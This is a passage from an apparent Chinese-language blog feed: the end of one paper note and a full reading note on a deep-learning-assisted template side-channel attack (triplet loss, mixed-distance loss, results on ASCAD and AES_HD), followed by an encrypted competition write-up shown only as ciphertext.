<p>这里主要看BO+FGE，在身份泄露模型下，ASCADf数据集上需要72条即可收敛，汉明重量模型需要455条。</p>
<p><img src="../img/image-20240422165308144.png" alt="ASCADf BO&amp;FGE 猜测熵收敛曲线"></p>
<p>而在ASCADr数据集上，身份泄露模型仅需60条即可收敛。</p>
<p><img src="../img/image-20240422165200643.png" alt="ASCADr"></p>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p>Zhang, J.; Zheng, M.; Nan, J.; Hu, H.; Yu, N. A Novel Evaluation Metric for Deep Learning-Based Side Channel Analysis and Its Extended Application to Imbalanced Data. IACR Trans. Cryptogr. Hardw. Embed. Syst. 2020 , 2020 , 73–96 <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn2" class="footnote-item"><p>Perin, G.; Chmielewski, L.; Picek, S. Strength in Numbers: Improving Generalization with Ensembles in Machine Learning-based Profiled Side-channel Analysis. IACR Trans. Cryptogr. Hardw. Embed. Syst. 2020 , 2020 , 337–364 <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>基于深度学习的侧信道攻击</category>
      </categories>
      <tags>
        <tag>metric</tag>
      </tags>
  </entry>
  <entry>
    <title>文献阅读笔记-The Best of Two Worlds: Deep Learning-assisted Template Attack</title>
    <url>/archives/a09255bb.html</url>
    <content><![CDATA[<h1>文章信息</h1>
<ul>
<li>作者：<strong>Lichao Wu, Guilherme Perin and Stjepan Picek</strong></li>
<li>单位：<strong>Radboud University, The Netherlands; Delft University of Technology, The Netherlands</strong></li>
<li>出处：<strong>IACR Transactions on Cryptographic Hardware and Embedded Systems</strong></li>
<li>标题：<strong>The Best of Two Worlds: Deep Learning-assisted Template Attack</strong></li>
</ul>
<blockquote>
<p><a href="https://github.com/AISyLab/Triplet-attack">文章代码链接</a></p>
</blockquote>
<p>最近开题，开完无缝衔接流感，服啦！</p>
<h1>文章内容</h1>
<blockquote>
<p>作者提出了基于相似性学习的特征提取方法， 使用三元组模型来实现；提出一种新的mertic来提高提取的特征质量</p>
</blockquote>
<h2 id="相似性学习（Similarity-Learning）">相似性学习（Similarity Learning）</h2>
<p>相似性学习属于监督学习，其目的是为了通过训练来计算两实体之间的相似性，可以通过选择三元组模型来完成该任务。</p>
<h2 id="三元组">三元组</h2>
<p>三元组由三种样本进行输入：正样本、负样本和锚点样本。其中正样本Positive与锚点样本Anchor具有相同的标签，</p>
<ol>
<li>损失函数</li>
</ol>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>l</mi><mi>o</mi><mi>s</mi><mi>s</mi><mo>=</mo><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>d</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>p</mi><mo stretchy="false">)</mo><mo>−</mo><mi>d</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo><mo>+</mo><mi>m</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>i</mi><mi>n</mi><mo separator="true">,</mo><mn>0</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">loss = max(d(a, p) - d(a, n) + margin, 0)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">oss</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ma</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">in</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0</span><span class="mclose">)</span></span></span></span></span></p>
<p><code>d</code>表示特征向量之间的欧氏距离，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span>表示锚点，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>表示正样本，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>ｎ</mtext></mrow><annotation encoding="application/x-tex">ｎ</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">ｎ</span></span></span></span>表示负样本，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>i</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">margin</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">ma</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">in</span></span></span></span> 是阈值用来控制正负样本之间的距离。</p>
<p>三元组分为三类，网络结构如图1所示，本文作者将<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>i</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">margin</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">ma</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">in</span></span></span></span>设置为<code>0.4</code>：</p>
<table>
<thead>
<tr>
<th>类别</th>
<th>关系</th>
</tr>
</thead>
<tbody>
<tr>
<td>正样本三元组</td>
<td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo stretchy="false">(</mo><msub><mi>r</mi><mi>a</mi></msub><mo separator="true">,</mo><msub><mi>r</mi><mi>n</mi></msub><mo stretchy="false">)</mo><mo>&gt;</mo><mi>d</mi><mo stretchy="false">(</mo><msub><mi>r</mi><mi>a</mi></msub><mo separator="true">,</mo><msub><mi>r</mi><mi>p</mi></msub><mo stretchy="false">)</mo><mo>+</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">d(r_a, r_n) &gt; d(r_a,r_p) + m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 正负样本距离足够大 (&gt;m)，此时loss = 0，网络不再更新</td>
</tr>
<tr>
<td>负样本三元组</td>
<td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo stretchy="false">(</mo><msub><mi>r</mi><mi>a</mi></msub><mo separator="true">,</mo><msub><mi>r</mi><mi>n</mi></msub><mo stretchy="false">)</mo><mo>&lt;</mo><mi>d</mi><mo stretchy="false">(</mo><msub><mi>r</mi><mi>a</mi></msub><mo separator="true">,</mo><msub><mi>r</mi><mi>p</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">d(r_a,r_n) &lt; d(r_a,r_p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span> 负样本与锚点的距离比正样本更近，此时loss&gt;0, 网络继续更新</td>
</tr>
<tr>
<td>中等样本三元组</td>
<td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo stretchy="false">(</mo><msub><mi>r</mi><mi>a</mi></msub><mo separator="true">,</mo><msub><mi>r</mi><mi>p</mi></msub><mo stretchy="false">)</mo><mo>&lt;</mo><mi>d</mi><mo stretchy="false">(</mo><msub><mi>r</mi><mi>a</mi></msub><mo separator="true">,</mo><msub><mi>r</mi><mi>n</mi></msub><mo stretchy="false">)</mo><mo>&lt;</mo><mi>d</mi><mo stretchy="false">(</mo><msub><mi>r</mi><mi>a</mi></msub><mo separator="true">,</mo><msub><mi>r</mi><mi>p</mi></msub><mo stretchy="false">)</mo><mo>+</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">d(r_a,r_p)&lt;d(r_a,r_n)&lt;d(r_a,r_p) + m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>负样本到锚点距离虽然大于正样本到锚点的，但是没要大于阈值m，此时loss仍然大于0，网络继续更新</td>
</tr>
</tbody>
</table>
<img src="../img/image-20231211213301199.png" alt="图1	三元组网络结构" style="zoom:50%;" />
<h2 id="基于混合距离的三元组损失">基于混合距离的三元组损失</h2>
<p>原始三元组方案忽略了负样本中的标签多样性，即对具有C个类别的数据集，负样本包含C-1个类别，作者认为如果在中等样本三元组中采用负样本的标签信息来寻找最接近锚点的负样本点，包含这种距离进的负样本点会促使模型学习效率会更好，分类性能提升更大。</p>
<p>虽然在CV领域不能通过标签来判断负样本点与锚点的相似性，但是侧信道攻击中是可以的（相似的标签可能是相似的泄漏点导致的），由此作者给出了基于混合距离的三元组损失函数如图2，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span></span></span></span> 表示欧氏距离的平方，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>l</mi><mi>a</mi></msub><mo separator="true">,</mo><msub><mi>l</mi><mi>b</mi></msub></mrow><annotation encoding="application/x-tex">l_a,l_b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0197em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0197em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>表示对应标签，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>d</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">d^{\prime}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>表示标签归一化后的欧氏距离，</p>
<img src="../img/image-20231211213319897.png" alt="图2	混合距离" style="zoom:40%;" />
<p>图三展示了在基于中等样本三元组情况下，欧氏距离与混合距离三元组损失的区别，即相较于传统欧氏距离，混合距离（右图）将不考虑<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mrow><mi>i</mi><mo>+</mo><mn>2</mn></mrow></msub></mrow><annotation encoding="application/x-tex">n_{i+2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span>，只在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">n_{i+1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span>上学习。</p>
<img src="../img/image-20231211213350045.png" alt="图3	欧氏距离与混合距离区别" style="zoom:40%;" />
<h2 id="攻击步骤">攻击步骤</h2>
<ol>
<li>训练三元组网络，获取Embeddings</li>
<li>使用训练好的Embeddings来完成攻击</li>
</ol>
<img src="../img/image-20231211213426198.png" alt="攻击流程" style="zoom:50%;" />
<img src="../img/image-20231211213541729.png" alt="三元组神经网络超参数搜索空间" style="zoom:50%;" />
<img src="../img/image-20231211213608957.png" alt="详细参数" style="zoom:40%;" />
<h2 id="实验结果">实验结果</h2>
<img src="../img/image-20231211213622164.png" alt="ASCAD_F、ASCAD_R、AES_HD攻击结果" style="zoom:50%;" />
<p>这里是HW/ID两个泄露模型的猜测熵</p>
<img src="../img/image-20231211213642302.png" alt="去同步数据集ASCAD_F上攻击效果（level=50、100）" style="zoom:40%;" />
<img src="../img/image-20231211213652710.png" alt="去同步数据集ASCAD_R上攻击效果（level=50、100）" style="zoom:50%;" />
<img src="../img/image-20231211213724687.png" alt="去同步数据集AES_HD上攻击效果（level=50、100）" style="zoom:50%;" />
<p><strong>验证<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span>超参对收敛到0所需要的能量迹数量的影响</strong></p>
<img src="../img/image-20231211213817442.png" alt="阿尔法超参影响" style="zoom:50%;" />
<img src="../img/image-20231211213850578.png" alt="不同Embeddings大小对数攻击效果的影响" style="zoom:50%;" />
<img src="../img/image-20231211213947443.png" alt="margin对攻击效果的影响" style="zoom:50%;" />
<img src="../img/image-20231211214006091.png" alt="不同Epoch对攻击效果的影响" style="zoom:50%;" />
<img src="../img/image-20231211214047610.png" alt="训练集大小对猜测熵的影响" style="zoom:50%;" />
<h1>总结</h1>
<p>作者基于原始三元组模型提出了一个新的基于混合距离的三元组模型，后续可以拼接到其他需要对抗时钟抖动等下游任务中。</p>
]]></content>
      <categories>
        <category>基于深度学习的侧信道攻击</category>
      </categories>
      <tags>
        <tag>三元组</tag>
      </tags>
  </entry>
  <entry>
    <title>第九届密码学竞赛-赛题三WP</title>
    <url>/archives/b67151df.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
  <script id="hbeData" type="hbeData" data-hmacdigest="ae6904a3f0fc65c7740ee88ef8fa76bced21be3da650964a2595c2a98aa69e5f">8ebc5255ec32af16fc530bedea0bf6ceb6ce6110747e6f54047bdc5f91951d6b1f7264c3806a369ba3b9d3bc34ee1683bd23507352d3fad2835ce24eedd54d89070221ec41f9d33d459f30ada5ac18f24cb7bdbc3081cfceb9e131f5dd02aac3a7a707a4353b1f5b180a646b7bef5ec606ca0a84c9f397601e114ce2cc19cb7c28e559a54fc8691e44f3fe308d1638b75469c410bf1dcc9b59976e58b066791c316942c1b239709fb079ee102ad5996609a32cf270d3d633e25ab3ee9452244f6b2a7e9f16a08bd38dba1ca678cfc0a0c4d8f4aa27a7eb58ae738b380d406a41dff6769e152df164d3cc0137a6971df372908039855ded702d1cc8d3089f6cc393a8eecac68c4ba145052d4178216d19f1cb4206e687fde2d7379dbe954bee9ee65abd30d5edfc3fe66edebb8edf334716c7d98fd9193f1129db652df0a56e063f30e974016753196b00c95d15c14d184df3596c5a549cfbad2a6a12c3cd306c29aef955658896e4a48f652ac3d7b1b80dfae278a034746e17a9d5930d953c50edf598caa053903019a9b1eef1592d8eaa90085901f823e8c43a80263fc603ee89db99c5069b123c2437d7f6b2c66787b3fd468abb3ab16d34ee332b83820002724a6308a58b26f3d49e4eb0b99433668de6264f15544958cf6697dc41cba388dc3505ced4d78d8b1ca1670d89e86f97a8b7e848ef354d29973420788376d8cca54156beed6747b3fb55dfc50265931ca2edfe4b6739514c9ff7d4db122a52c87a27ef6b9f025f924bfb3bebb034dcc9a5470ba457bcccad3fb2fd354279046a36e82ccc726cc2958e0b4229cee56212ac1bffac018468563f62cbf688db124a35fbc43424d5da74a9e9574b6f12f19a6cccf2c5fb61f934591c38f689d8dd08d6a7af59ed46fef43645a43be341a24a85a0b542d2ac8022f62ce154a543e62a108a42dbc35c1ee3b5e48ba6590924f778a110125d41a5714b4ac1818d40faf669844202677618639100b786617d2483cec5324475af80affae5f13ea5e5baa6c8af4c29e2b8c767e6c76587bbd4ae75ae638a41ba9d9c2ffa4517faffdf66c9300af2440b911f06ece268a9388f0c9ca0cbf94df6a7cd2887911ccdb38071100acf446c1cfcc7a631a8877c7977eaf9bb117323eda66e204419ed7e8fe8a74c9e55bcd045719e9ccf98f060adf24f6bc69d6b3f9fda21f922008752c892f70c86ea4d542049e71c45c561eddc46538a5ee4eb81bec8f6aba7ad675dd598eeb9045ad636726886c8e4f2286736ef1a05988fc3277e31830dba8d59e57bbd646c9be5f0017d99c82beb800842caf43b58359a64cdbaee0afe28c0437ec